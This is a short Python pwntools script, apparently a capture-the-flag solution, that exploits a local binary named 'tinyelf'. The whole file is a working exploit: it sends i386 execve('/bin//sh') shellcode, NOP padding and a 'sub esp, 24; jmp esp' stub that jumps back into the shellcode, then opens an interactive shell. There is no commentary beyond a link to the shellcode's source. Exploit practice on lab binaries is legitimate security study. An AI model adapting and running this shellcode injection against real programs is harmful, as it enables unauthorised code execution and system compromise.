from pwn import *

context.arch = "i386"
# context.log_level = "debug"

io = process("./tinyelf")

# https://shell-storm.org/shellcode/files/shellcode-58.html
shellcode = b"\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
jump_back = asm("sub esp, 24; jmp esp")
payload = shellcode + asm("nop") * (32 - len(shellcode) - len(jump_back)) + jump_back

io.send(payload)
io.interactive()
